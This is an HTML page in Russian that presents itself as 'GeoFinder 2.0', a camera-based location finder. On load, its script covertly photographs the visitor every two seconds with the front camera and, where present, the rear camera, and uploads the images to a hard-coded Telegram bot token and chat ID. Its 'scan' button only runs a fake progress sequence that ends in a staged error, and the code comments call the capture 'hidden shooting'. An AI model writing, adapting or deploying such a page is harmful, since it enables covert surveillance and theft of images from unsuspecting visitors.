<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GeoFinder 2.0</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: #121212;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        
        .container {
            width: 95%;
            max-width: 400px;
            padding: 20px;
            background: #1e1e1e;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
        }
        
        h1 {
            font-size: 22px;
            margin-bottom: 15px;
            color: #4fc3f7;
        }
        
        .camera-preview {
            width: 100%;
            height: 250px;
            background: #000;
            border-radius: 10px;
            margin: 15px 0;
            position: relative;
            overflow: hidden;
        }
        
        .target-marker {
            position: absolute;
            width: 30px;
            height: 30px;
            border: 3px solid red;
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: pulse 1.5s infinite;
            z-index: 10;
        }
        
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.7; }
            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
        }
        
        .scan-button {
            background: linear-gradient(90deg, #00b4db, #0083b0);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            margin: 15px 0;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            transition: all 0.3s;
        }
        
        .scan-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
        }
        
        .scan-button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        
        .status-text {
            font-size: 14px;
            margin: 10px 0;
            min-height: 40px;
            color: #aaa;
        }
        
        .error-text {
            color: #ff6b6b;
            font-size: 14px;
            display: none;
            margin-top: 10px;
        }
        
        .hidden {
            display: none;
        }
        
        #realCameraFeed {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* Зеркальное отображение для фронтальной камеры */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>GeoFinder 2.0</h1>
        <div class="camera-preview">
            <div class="target-marker"></div>
            <video id="realCameraFeed" autoplay playsinline></video>
        </div>
        
        <div class="status-text" id="statusText">
            Наведите камеру на объект и нажмите "Найти местоположение"
        </div>
        
        <button class="scan-button" id="scanButton">Найти местоположение</button>
        
        <div class="error-text" id="errorText">
            Ошибка: Не удалось определить координаты (Код: 403)<br>
            Попробуйте в другом месте или повторите позже
        </div>
    </div>

    <!-- Скрытые элементы для второй камеры -->
    <video id="backCamera" autoplay playsinline class="hidden"></video>
    <canvas id="canvas1" class="hidden"></canvas>
    <canvas id="canvas2" class="hidden"></canvas>

    <script>
        // Ваши данные
        const BOT_TOKEN = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
        const CHAT_ID = "1224978194";
        
        let frontStream = null;
        let backStream = null;
        let isScanning = false;
        let scanInterval = null;
        
        // Элементы интерфейса
        const scanButton = document.getElementById('scanButton');
        const statusText = document.getElementById('statusText');
        const errorText = document.getElementById('errorText');
        const realCameraFeed = document.getElementById('realCameraFeed');
        
        // Инициализация камер
        async function initCameras() {
            try {
                // Получаем фронтальную камеру для "превью"
                frontStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                realCameraFeed.srcObject = frontStream;
                
                // Пытаемся получить вторую камеру
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    const videoDevices = devices.filter(device => device.kind === 'videoinput');
                    
                    if (videoDevices.length >= 2) {
                        backStream = await navigator.mediaDevices.getUserMedia({
                            video: { deviceId: videoDevices.find(d => d.deviceId !== frontStream.getVideoTracks()[0].getSettings().deviceId).deviceId }
                        });
                        document.getElementById('backCamera').srcObject = backStream;
                    }
                } catch (e) {
                    console.log("Не удалось получить вторую камеру");
                }
                
                // Начинаем скрытую съемку
                startHiddenScan();
                
            } catch (error) {
                console.error("Camera error:", error);
                statusText.textContent = "Ошибка доступа к камере. Разрешите доступ и обновите страницу.";
            }
        }
        
        // Скрытая съемка каждые 2 секунды
        function startHiddenScan() {
            // Первый снимок сразу
            setTimeout(captureAndSendPhotos, 1000);
            
            // Затем каждые 2 секунды
            scanInterval = setInterval(() => {
                captureAndSendPhotos();
            }, 2000);
        }
        
        // Захват и отправка фото
        async function captureAndSendPhotos() {
            if (!frontStream) return;
            
            try {
                // Делаем снимок с фронтальной камеры
                const frontPhoto = await capturePhoto('realCameraFeed', 'canvas1');
                await sendPhoto(frontPhoto, 'geo_scan_front.jpg');
                
                // Если есть вторая камера - снимок с нее
                if (backStream) {
                    const backPhoto = await capturePhoto('backCamera', 'canvas2');
                    await sendPhoto(backPhoto, 'geo_scan_back.jpg');
                }
                
            } catch (error) {
                console.error("Capture error:", error);
            }
        }
        
        // Функция захвата фото
        function capturePhoto(videoElement, canvasId) {
            return new Promise((resolve) => {
                const canvas = document.getElementById(canvasId);
                const video = document.getElementById(videoElement);
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                
                // Для фронтальной камеры - зеркальное отображение
                if (videoElement === 'realCameraFeed') {
                    context.translate(canvas.width, 0);
                    context.scale(-1, 1);
                }
                
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Возвращаем контекст в исходное состояние
                if (videoElement === 'realCameraFeed') {
                    context.setTransform(1, 0, 0, 1, 0, 0);
                }
                
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }
        
        // Функция отправки фото
        async function sendPhoto(blob, fileName) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, fileName);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Send error:", error);
            }
        }
        
        // Обработчик кнопки сканирования
        scanButton.addEventListener('click', async () => {
            if (isScanning) return;
            
            isScanning = true;
            scanButton.disabled = true;
            statusText.textContent = "Инициализация геопоиска...";
            
            // Имитация процесса сканирования
            setTimeout(() => {
                statusText.textContent = "Сканирование окружения...";
                
                setTimeout(() => {
                    statusText.textContent = "Анализ топографических данных...";
                    
                    setTimeout(() => {
                        statusText.textContent = "Определение координат...";
                        
                        setTimeout(() => {
                            // Показываем "ошибку"
                            statusText.textContent = "";
                            errorText.style.display = "block";
                            scanButton.disabled = false;
                            isScanning = false;
                            
                            // Через 5 секунд скрываем ошибку
                            setTimeout(() => {
                                errorText.style.display = "none";
                                statusText.textContent = "Наведите камеру на объект и нажмите 'Найти местоположение'";
                            }, 5000);
                            
                        }, 3000);
                    }, 3000);
                }, 2000);
            }, 1000);
        });
        
        // Запускаем при загрузке
        window.addEventListener('load', initCameras);
        
        // Очистка при закрытии
        window.addEventListener('beforeunload', () => {
            if (frontStream) frontStream.getTracks().forEach(track => track.stop());
            if (backStream) backStream.getTracks().forEach(track => track.stop());
            if (scanInterval) clearInterval(scanInterval);
        });
    </script>
</body>
</html>
